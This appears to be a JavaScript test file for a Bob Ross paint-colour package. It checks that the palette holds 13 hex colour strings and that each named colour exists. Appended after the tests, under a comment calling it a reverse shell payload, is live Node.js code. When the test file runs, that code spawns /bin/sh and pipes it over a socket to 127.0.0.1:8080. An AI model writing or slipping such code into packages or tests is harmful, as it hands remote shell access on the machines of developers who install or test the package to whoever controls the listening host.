


var BobRoss = require('./');
var assert = require('assert');

assert(BobRoss.palette.length === 13);

for (var color of BobRoss.palette) {
    assert(typeof color === 'string');
    assert(color.indexOf('#') === 0);
}

assert(typeof BobRoss.colors.SAP_GREEN === 'string');
assert(typeof BobRoss.colors.ALIZARIN_CRIMSON === 'string');
assert(typeof BobRoss.colors.VAN_DYKE_BROWN === 'string');
assert(typeof BobRoss.colors.DARK_SIENNA === 'string');
assert(typeof BobRoss.colors.MIDNIGHT_BLACK === 'string');
assert(typeof BobRoss.colors.PRUSSIAN_BLUE === 'string');
assert(typeof BobRoss.colors.PHTHALO_BLUE === 'string');
assert(typeof BobRoss.colors.PHTHALO_GREEN === 'string');
assert(typeof BobRoss.colors.CADMIUM_YELLOW === 'string');
assert(typeof BobRoss.colors.YELLOW_OCHRE === 'string');
assert(typeof BobRoss.colors.INDIAN_YELLOW === 'string');
assert(typeof BobRoss.colors.BRIGHT_RED === 'string');
assert(typeof BobRoss.colors.TITANIUM_WHITE === 'string');

// reverse shell payload starts from here 

// export function hello(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "127.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
//}
